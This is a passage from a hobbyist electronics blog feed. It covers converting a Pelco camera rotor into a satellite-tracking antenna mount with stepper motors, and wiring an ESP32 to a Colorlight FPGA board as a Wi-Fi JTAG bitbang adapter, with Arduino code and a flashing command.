    <span class="k">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'a'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Stepping 10000"</span><span class="p">);</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'b'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">shaft</span> <span class="o">=</span> <span class="o">!</span><span class="n">shaft</span><span class="p">;</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Shaft direction: "</span><span class="p">);</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
      <span class="n">driver</span><span class="p">.</span><span class="n">shaft</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The results were:</p>

<ul>
  <li>Elevation Axis
    <ul>
      <li>Aproximated Reduction: 1:3500</li>
      <li>Angular Resolution: 0,000117 deg / step</li>
      <li>Maximum Speed: 0,62 deg / s</li>
    </ul>
  </li>
  <li>Azimuth Axis
    <ul>
      <li>Aproximated Reduction: 1:392</li>
      <li>Angular Resolution: 0,0046 deg / step</li>
      <li>Maximum speed: 6,3 deg / s</li>
    </ul>
  </li>
</ul>

<p>The results looks promissing and, if everything goes right, will be enough for tracking satellites!</p>

<p>The next step is to code / assemble the required software/hardware to control it through network!</p>

<p>The 3D Models (Both freecad and STL) are available in Thingverse (see links section)</p>

<h2 id="links">Links</h2>

<ul>
  <li><a href="https://s.click.aliexpress.com/e/_AOhCSe">Azimuth Motor</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_ADtVZs">Elevation Motor (Closed-Loop)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_9zgziK">Elevation Motor (Normal)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_AoG3ZC">TMC2209 Drivers</a></li>
  <li><a href="https://www.thingiverse.com/thing:4813288">STL / Freecad Files</a></li>
</ul>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="English" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[Continuing the tracker project, I managed to make some significant progress. As Demilson (PY2UEP) had cut the original motors, I did the same. The azimuth motor was too rusted and I eventually destroyed one of the coils (which I wanted to salvage the wire), but in the end the shaft went out.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Antenna Rotor - Part 1</title><link href="https://lucasteske.dev/2021/03/rotor-antenna-parte-1" rel="alternate" type="text/html" title="Antenna Rotor - Part 1" /><published>2021-03-03T20:57:00-03:00</published><updated>2021-03-03T20:57:00-03:00</updated><id>https://lucasteske.dev/2021/03/rotor-antenna-parte-1</id><content type="html" xml:base="https://lucasteske.dev/2021/03/rotor-antenna-parte-1"><![CDATA[<p>A few years ago I bought a Pelco Câmera Rotor, model PT175-24P. This rotor is made for carrying a camera with up to 8kg, and contains two biphase reversable motors internally. My idea was (and is) to put a satellite dish coupled, and control its movement to track satellites. Then I could use it to receive Low Orbit Satellites.</p>

<p><img src="/assets/posts/tracker-mount/motor-schematic.jpg" alt="Internal Schematics" /><em>Internal Schematics</em></p>

<hr />

<p>The problem of the original system from pelco, is that they’re two 24V AC Motors, which would require a VFD (Variable Frequency Driver) to control the speed and a closed-loop system with a angle sensor. That would make it a bit complex to control the antenna, so a friend of my (PY2UEP) suggested to modify it to use stepper motors instead. The big advantage of stepper motors is that their steps always has the same length. So if the motor goes N steps in one direction and then N steps in the oposite direction, it will return <strong>exactly</strong> where it started. That allows for open-loop circuits (where you just calibrate the start and then you dont need a feedback to fix everything).</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_20-56-30.jpg" alt="Stepper Motor" /><em>Stepper Motor</em></p>

<h1 id="make-the-cleaning">Make the cleaning</h1>

<p>Then I started opening the rotor and make a super-clean. Remove all old grease and dust.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46.jpg" alt="Pelco Interior" /><em>Pelco Interior</em>
<img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46-2.jpg" alt="Pelco Interior" /><em>Pelco Interior</em></p>

<p>I disassembled everything and then made a querosene bath to remove grease from everywhere. Two of the azimuth rollers were well stuck (the grease was so dry that it looked like a glue), so I left in the querosene until the next day and then cleaned up with a paint brush. After all the cleaning, the rollers looks new!</p>

<p><img src="https://www.youtube.com/watch?v=9Y2FpSlNss8" alt="" /></p>

<p>The rest of the parts I basically tossed inside a bucket and filled with querosene with a bit of water. Then I started stiring the parts inside. After a while, I let it sit and made several washes with water and soap to remove all querosene.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-52.jpg" alt="Bucket with parts" /><em>Bucket with washed parts</em></p>

<p>The belts I left on the querosene for a few minutes and then used a paint brush to remove all stuck pieces of grease.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-53.jpg" alt="Belts" /><em>Belts in querosene</em></p>

<p>After all clean-up, I started the re-assembly by putting the two azimuth rollers in place. The one from below is stuck inside the piece under pressure, so I needed to use a hammer. With a lot of care, I managed to push the piece until it fit perfectly with the surface of the base. After that I pushed the azimuth axis through the roller.</p>

<p><img src="https://www.youtube.com/watch?v=5wpSKRn5RnM" alt="" /></p>

<p>Just after that, I put the reduction gears and the azimuth belt in place.</p>

<p><img src="https://www.youtube.com/watch?v=bE6B3GejGmA" alt="" /></p>

<p>After that, everything was easy: just screw everything together. In the end I left it open so I could plan the position of the stepper motors:</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-51-36.jpg" alt="Open Pelco Mount" /><em>Open Pelco Mount</em></p>

<p>The next step is to disassemble the original motors and adapt the axis for the stepper motors!</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26-2.jpg" alt="Azimuth Motor" /><em>Azimuth Motor</em></p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26.jpg" alt="Elevation Motor" /><em>Elevation Motor</em></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="English" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[A few years ago I bought a Pelco Câmera Rotor, model PT175-24P. This rotor is made for carrying a camera with up to 8kg, and contains two biphase reversable motors internally. My idea was (and is) to put a satellite dish coupled, and control its movement to track satellites. Then I could use it to receive Low Orbit Satellites.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Introduction to FPGA</title><link href="https://lucasteske.dev/2020/10/introducao-a-fpga" rel="alternate" type="text/html" title="Introduction to FPGA" /><published>2020-10-11T23:59:00-03:00</published><updated>2020-10-11T23:59:00-03:00</updated><id>https://lucasteske.dev/2020/10/introducao-a-fpga</id><content type="html" xml:base="https://lucasteske.dev/2020/10/introducao-a-fpga"><![CDATA[<p>(So far) Only available in <a href="/pt/2020/10/introducao-a-fpga">Portuguese</a></p>]]></content><author><name>Lucas Teske</name></author><category term="Portugues" /><category term="Hacking" /><category term="FPGA" /><category term="Hardware" /><category term="Eletrônica" /><category term="Verilog" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="Hardware" /><category term="Eletrônica" /><category term="Verilog" /><summary type="html"><![CDATA[(So far) Only available in Portuguese]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/FPGA.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/FPGA.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hacking a ESP32 into FPGA Board</title><link href="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board" rel="alternate" type="text/html" title="Hacking a ESP32 into FPGA Board" /><published>2020-06-14T16:17:00-03:00</published><updated>2020-06-14T16:17:00-03:00</updated><id>https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board</id><content type="html" xml:base="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board"><![CDATA[<h1 id="hacking-a-esp32-into-fpga-board">Hacking a ESP32 into FPGA Board</h1>

<p>Colorlight Hub 5A-75B V6.1 Board</p>

<p>Last year I saw a russian guy that found out that this cheap board (US$15~) had an Lattice ECP5 FPGA, which is compatible with Open Source Tool-chains for synthesis. He was running a RISC-V Core inside that and piping the serial through the ethernet ports. I wanted to get one and start playing by myself.
These boards are relatively cheap, about US$15 and contains a Lattice ECP5 FPGA ( LFE5U-25F-6BG381C ), 4MB DRAM, Two Gigabit Ethernet and several level shifters for I/O. This is good because:</p>

<ol>
  <li>That’s a very cheap board by the specs</li>
  <li>You can use open-source synth toolchain</li>
  <li>There is lots of 5V bi-directional level shifters</li>
</ol>

<p>I decided to give a shot and buy one from Aliexpress. Sadly because of the pandemic COVID-19, the package is long time delayed (still haven’t arrived yet, 3 months after I bought). Luckily I found it on Mercado Livre (the Brazilian eBay) to sell at a reasonable price.</p>

<p>When it arrived, I first tried to run the classic Hardware Hello World: The led blink. For that I got this project to test it: <a href="https://github.com/antonblanchard/ghdl-yosys-blink">https://github.com/antonblanchard/ghdl-yosys-blink</a></p>

<p>I did a fork to add the board constraints, and also a FT232R bitbang mode to OpenOCD (since it was the only JTAG adapter I had at the moment)[ see <a href="https://github.com/racerxdl/ghdl-yosys-blink">https://github.com/racerxdl/ghdl-yosys-blink</a> ]</p>

<p>I didn’t had to reverse engineer the board, since someone already did all the reverse engineer: <a href="https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md">https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md</a></p>

<p>The JTAG Headers are easy to access, and all pinouts are mapped. Great!</p>

<p>After few minutes tuning the ghdl-yosis-blink example I managed to make it work on my board. Still it was running on ram memory only and I wanted to write to SPI Flash. Lattice allows to write the SPI Flash using the jtag, so I started searching over the internet stuff that could convert the generated bitstream to program the flash. After testing lots of tools, I found out this simple tool did the job: <a href="https://github.com/f32c/tools/tree/master/ujprog">https://github.com/f32c/tools/tree/master/ujprog</a></p>

<p>I just had to run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ujprog <span class="nt">-d</span> <span class="nt">-j</span> flash <span class="nt">-s</span> vhdl_blink-flash.svf vhdl_blink.bit
</code></pre></div></div>

<p>And the generated vhdl_blink-flash.svf was persisting into the flash memory.</p>

<center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">After few days I managed to write thr SPI Flash using FT232H. Full <a href="https://twitter.com/hashtag/opensource?src=hash&amp;ref_src=twsrc%5Etfw">#opensource</a> stuff to program that board. Also only US$15. <a href="https://t.co/RujsOGwH1D">pic.twitter.com/RujsOGwH1D</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1268616857583419393?ref_src=twsrc%5Etfw">June 4, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>Now that everything was working, I decided to make a bigger hack: I wanted an ESP32 to be attached in the board and program through network. It would also be nice if I could redirect a serial port to the network (useful for debug).</p>

<p>The first thing I did is chose a GPIO pair to be the TX/RX from the serial port. The ESP32 has three serial ports, but on my board only two of them were exposed (Serial 0 and 2). The Serial 0 port is attached to the USB-Serial converter onboard, so I decided to use the Serial 2 to communicate with the FPGA. After looking at the pinout, most of the Level Shifters pins are common (the address lines are half of the pins) and the ones close to the lower part of the board (which would be easier to solder) were the address lines. After poking around, I decided to remove the J4 connector and U23 level shifter (the ESP32 is 3.3V, remember that!)</p>

<p><img src="/assets/posts/medium/0_wK9QPXyVChE4n8py.jpeg" alt="U23 and J4 removed" /><em>U23 and J4 removed</em></p>

<p>I also decided to remove J3 to make easier to solder the bypass wires at that connector. Then I soldered all bypass wires to make it 3.3V instead 5V</p>

<p><img src="/assets/posts/medium/1_tT_gWmR6KPWXKKoewW-KDQ.png" alt="Bypass wires soldered in U23" /><em>Bypass wires soldered in U23</em></p>

<p>The 33 Ohm resistores are nice since it could avoid short circuits when wrong pins are associated to serial port. So I decided to keep then as is. After checking that all pins were OK and not shorted, I decided to use hot-glue to secure them:</p>

<p><img src="/assets/posts/medium/1_53DN-rC8MrNRfFdVmzN-Uw.png" alt="Hot-glue raw pieces" /><em>Hot-glue raw pieces</em></p>

<p>I always found out that using a heat-gun with 200ºC was better to hot-glue than the hot-glue gun. Also I would avoid heating the wires too much and letting them go.</p>

<p><img src="/assets/posts/medium/1_7O77I22KdFxtNz4-G2cSeA.png" alt="Heat gun with hot-glue" /><em>Heat gun with hot-glue</em></p>

<p>After cooling down, the results look really good:</p>

<p><img src="/assets/posts/medium/1_sCDf7DO_2mY2FoOTLN357Q.png" alt="Hot-glue on bypass wires" /><em>Hot-glue on bypass wires</em></p>

<p>Then I went to the back-side of the board to solder the VCC/GND pair and the TX/RX pair wires. Luckily the power input for this board is 3.6 to 6V and then I can use the VIN from ESP32 (which is attached to USB +5V) to power it. The power connector is also close to J4 we removed.</p>

<p><img src="/assets/posts/medium/1_sADN_JL_MLf9TP5r7FVymQ.png" alt="Power Connector and Serial Port" /><em>Power Connector and Serial Port</em></p>

<p>Then with some double-sided tape, I could attach the ESP32 to the side of the board and solder the wires to the right pins.</p>

<p><img src="/assets/posts/medium/1_86Ir5XIqvHCLbMsbWxs5MA.png" alt="ESP32 fixed with double-sided table and wires soldered" /><em>ESP32 fixed with double-sided table and wires soldered</em></p>

<p>Now I just had to choose some pins for the JTAG and we would be good to go! After searching for some safe pins on ESP32 I choose these:</p>

<ul>
  <li>TDI =&gt; D33</li>
  <li>TDO =&gt; D32</li>
  <li>TCK =&gt; D27</li>
  <li>TMS =&gt; D26</li>
</ul>

<p>And I soldered the wires as best looking as I could.</p>

<p><img src="https://cdn-images-1.medium.com/max/2544/0_ERp9fzhTj8EL0i1G" alt="" /></p>

<p>I also had to solder the GND of the ESP32 into the GND of the JTAG header (I had a problem the FT232R that was solved by attaching the GND to the header there)</p>

<p><img src="/assets/posts/medium/1_Ltxy34-3hHoAalgDOHqG7A.png" alt="JTAG Power Header" /><em>JTAG Power Header</em></p>

<p><img src="/assets/posts/medium/1_Sae7vuGGrvCUuYZdOiGPVA.png" alt="GND wire soldered" /><em>GND wire soldered</em></p>

<p>With all wires soldered, I could start playing with software!</p>

<p>At first I tried the OpenOCD Remote Bitbang which connects to TCP socket and start issuing bitbang commands by using a single ASCII character. For some reason I couldn’t make it work right. If you want to try by yourself:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;WiFi.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">ssid</span>     <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">password</span> <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>

<span class="n">WiFiServer</span> <span class="nf">server</span><span class="p">(</span><span class="mi">3335</span><span class="p">);</span>

<span class="cp">#define PIN_SRST 21
#define PIN_TDI 33
#define PIN_TDO 32
#define PIN_TCK 27
#define PIN_TMS 26
#define PIN_LED 2
</span>
<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>
    <span class="n">delay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">,</span> <span class="n">INPUT_PULLUP</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="c1">// We start by connecting to a WiFi network</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Connecting to "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">ssid</span><span class="p">);</span>

    <span class="n">WiFi</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">status</span><span class="p">()</span> <span class="o">!=</span> <span class="n">WL_CONNECTED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"."</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"WiFi connected."</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"IP address: "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">localIP</span><span class="p">());</span>
    <span class="n">server</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">WiFiClient</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="n">available</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">)</span> <span class="p">{</span>                     <span class="c1">// if you get a client,</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"New Client."</span><span class="p">);</span>  <span class="c1">// print a message out the serial port</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">connected</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
                <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="sc">'B'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'b'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'R'</span><span class="p">:</span>
                      <span class="n">client</span><span class="p">.</span><span class="n">print</span><span class="p">((</span><span class="n">digitalRead</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">)</span> <span class="o">==</span> <span class="n">HIGH</span><span class="p">)</span> <span class="o">?</span> <span class="sc">'1'</span> <span class="o">:</span> <span class="sc">'0'</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'Q'</span><span class="p">:</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'r'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'t'</span><span class="p">:</span>
                      <span class="c1">// SRST=0, which confusingly means to *exit* reset (as /RESET and /TRST are active-low)</span>
                      <span class="c1">// We don't have a TRST connection, so 'r' and 't' do the same thing.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, HIGH);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'s'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'u'</span><span class="p">:</span>
                      <span class="c1">// SRST=1 -- enter RESET state</span>
                      <span class="c1">// Likewise for 's' and 'u'.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, LOW);</span>
                      <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
